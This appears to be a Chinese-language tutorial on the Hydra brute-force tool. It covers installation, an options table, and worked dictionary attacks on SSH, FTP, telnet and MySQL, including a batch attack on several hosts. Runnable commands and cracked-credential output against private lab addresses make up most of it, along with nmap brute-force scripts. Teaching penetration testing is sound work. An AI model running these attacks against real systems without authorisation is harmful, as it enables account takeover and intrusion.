# hydra暴力破解工具
Hydra是一款暴力破解工具，进行并行登录破解，破解远程服务的用户名密码，由黑客组织[THC](https://www.thc.org/)开发，它可以对超过50个协议进行快速字典攻击，包括telnet、ftp、http(s)、smb、MySQL、SMTP等。

<!--more-->
## Hydra安装
官方github地址：[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)
Kali Linux中自带Hydra，下面介绍其它系统安装方法。
### Ubuntu安装
```sh
$ apt-get install hydra
```

### centos系统安装
**1、下载**
地址：[https://github.com/vanhauser-thc/thc-hydra/releases/tag/v9.2](https://github.com/vanhauser-thc/thc-hydra/releases/tag/v9.2)

**2、安装依赖**

```sh
$ yum install openssl-devel pcre-devel ncpfs-devel postgresql-devel libssh-devel subversion-devel libncurses-devel
```
**3、编译安装**

```sh
$ tar zxf thc-hydra-9.2.tar.gz
$ cd thc-hydra-9.2
$ ./configure
$ make
$ make install
```

查看帮助信息：
```sh
hydra -h
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
  -R        restore a previous aborted/crashed session
..............
```

### windows安装
GitHub地址：[https://github.com/maaaaz/thc-hydra-windows](https://github.com/maaaaz/thc-hydra-windows)
下载发布版本，解压就可以使用了

## Hydra参数说明

|          选项           | 说明 |
| :---------------------: | :--: |
| -R |  继续上一次破解    |
| -I  | 忽略现有还原文件（不等待10秒）    |
| -s PORT   |  指定默认端口    |
| -l LOGIN  |  指定破解登录用户名   |
| -L FILE   |  使用文件指定多个用户名  |
| -p PASS |  指定密码  |
| -P FILE   |  指定密码字典  |
| -x MIN:MAX:CHARSET |  密码暴力生成 |
| -y   |  禁止在暴力破解中使用符号  |
|     -r    |  对选项-x使用非随机方法  |
|     -e nsr    |  n：空密码试探，s：使用指定用户和密码试探。  |
|     -u    |  循环用户  |
|     -C FILE    |  冒号分隔用户名密码："login:pass" 格式  |
|     -M FILE    |  要攻击的服务器列表，每行一个条目，':'指定端口  |
|     -o FILE    |  将找到的登录/密码写入文件  |
|     -b FORMAT    |  指定-o输出格式，默认text,可选json, jsonv1  |
|     -f / -F    |  找到用户名/密码后中止破解，-f:每个主机，-F：所有  |
|     -t TASKS    |  每个主机并行线程数，默认16  |
|     -T TASKS    |  所有并行线程数，默认64  |
|     -w / -W TIME   |  最大等待响应时间  |
|     -c TIME    |  所有进程每次尝试登录等待时间  |
|     -4 / -6    |  IPv4(默认)/IPv6地址  |
|     -v / -V / -d  |  详细日志模式/每次尝试仅显示用户名密码/调试模式 |
|     -k   |  不重做失败的尝试（适用于-M批量扫描）  |
|     -q    |  不要打印错误连接消息  |
|     -U    |  服务模块详细使用信息  |
|     server    |  目标服务名称或IP地址(也可以使用-M参数)  |
|     service    |  要破解的服务  |
|     OPT    |  可选项  |

支持的服务包括：adam6500, asterisk, cisco, cisco-enable, cvs, ftp, http-{head|get|post}, http-{get|post}-form, http-proxy, http-proxy-urlenum, icq, imap, irc, ldap2, ldap3[s], mssql, mysql(v4), nntp, pcanywhere, pcnfs, pop3, redis, rexec, rlogin, rpcap, rsh, rtsp, s7-300, smb, smtp, smtp-enum, snmp, socks5, teamspeak, telnet, vmauthd, vnc, xmpp

## Hydra使用实例
手动创建用户名字典和密码字典
```sh
$ cat user.txt 
admin
root
test
zhy
haha
$ cat pwd.txt 
admin
test
123456
666666
zhy
12345678
$ 
```

### 破解ssh
使用单个用户名密码
```sh
$ hydra 192.168.20.9 ssh -l root -p 12345678
ydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-21 23:41:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking ssh://192.168.20.9:22/
[22][ssh] host: 192.168.20.9   login: root   password: 12345678
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-21 23:41:46
```
上面的结果提示推荐使用`-t 4`，默认并发数为16


使用密码字典
```sh
$ hydra 192.168.20.9 ssh -L user.txt -P pwd.txt -t 4 -e ns
hydra ssh://192.168.20.9 -L user.txt -P pwd.txt -t 4 -e ns -f
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-21 23:50:05
[DATA] max 4 tasks per 1 server, overall 4 tasks, 40 login tries (l:5/p:8), ~10 tries per task
[DATA] attacking ssh://192.168.20.9:22/
[22][ssh] host: 192.168.20.9   login: root   password: 12345678
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-21 23:50:23
```
`-e ns`参数：尝试空密码

### 破解ftp/telnet
与ssh类似
```sh
$ hydra 192.168.20.9 ftp -L user.txt -P pwd.txt -t 4
$ hydra 192.168.20.9 telnet -L user.txt -P pwd.txt -t 4
```

### 破解MySQL数据库
```sh
$ hydra -L user.txt -P pwd.txt -t 4 127.0.0.1 mysql
$ hydra -L user.txt -P pwd.txt -t 4 mysql://127.0.0.1:3306
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-22 15:55:50
[DATA] max 4 tasks per 1 server, overall 4 tasks, 30 login tries (l:5/p:6), ~8 tries per task
[DATA] attacking mysql://127.0.0.1:3306/
[3306][mysql] host: 127.0.0.1   login: admin   password: admin
[3306][mysql] host: 127.0.0.1   login: root   password: 123456
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-22 15:55:51

```
ssh、ftp、telnet和mysql协议也可以使用nmap工具破解：
nmap暴力破解脚本：[https://nmap.org/nsedoc/categories/brute.html](https://nmap.org/nsedoc/categories/brute.html)
```sh
$ nmap --script ftp-brute -p 21 <host>
$ nmap --script ssh-brute -p 22 <host>
$ nmap --script mysql-brute -p 3306 <host>
```

### 批量破解多个主机：`-M`参数
创建主机字典：
```sh
$ cat host.txt
192.168.20.8
192.168.20.9
```

```sh
$ hydra -L user.txt -P pwd.txt -t 4 -M host.txt -f ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-21 23:59:03
[DATA] max 4 tasks per 2 servers, overall 8 tasks, 30 login tries (l:5/p:6), ~8 tries per task
[DATA] attacking ssh://(2 targets):22/
[22][ssh] host: 192.168.20.9   login: root   password: 12345678
[22][ssh] host: 192.168.20.8   login: root   password: 12345678
2 of 2 targets successfully completed, 2 valid passwords found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-21 23:59:17

```

将破解日志保存到文件中：
```sh
$ hydra -L user.txt -P pwd.txt -t 4 -vV -M host.txt -o results.log ssh
```





